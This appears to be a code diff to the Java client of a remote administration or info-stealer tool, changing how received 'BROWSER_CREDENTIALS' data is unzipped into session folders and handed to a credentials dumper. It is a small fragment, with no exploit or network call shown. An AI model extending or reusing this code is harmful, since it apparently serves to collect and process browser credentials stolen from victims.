@@ -64,9 +64,9 @@ public class Client {
                 bytesChannel.getBuffer().clear();
             }
             case BROWSER_CREDENTIALS -> {
-                writeFile(finalData, bytesChannel.getCategoryOutputFolder());
+                String outputPath = unzipCredentialsAndGetPath(finalData, bytesChannel.getCategoryOutputFolder());
                 closeFileChannel(bytesChannel.getId());
-                updater.updateCredentialsDumper(getbytesChannel);
+                updater.updateCredentialsDumper(outputPath);
             }
         }
         // closeFileChannel(bytesChannel.getId());
@@ -124,14 +124,14 @@ public class Client {
     public void writeFile(byte[] data, String category) {
         String finalNameOfFolder = category + " - " + new Time().getTime();
         Path pathOfDownload = Path.of(getSessionFolder(), finalNameOfFolder);
-        FileWriterTask task = new FileWriterTask(data, pathOfDownload.toString());
+        FileWriterTask task = new FileWriterTask(data, pathOfDownload.toString(), true);
         executor.execute(task);
     }
 
     public String unzipCredentialsAndGetPath(byte[] data, String category) {
         String finalNameOfFolder = category + " - " + new Time().getTime();
         Path pathOfDownload = Path.of(getSessionFolder(), finalNameOfFolder);
-        FileWriterTask task = new FileWriterTask(data, pathOfDownload.toString());
+        FileWriterTask task = new FileWriterTask(data, pathOfDownload.toString(), false);
         task.unzipFileInMemory();
         return pathOfDownload.toString();
     }
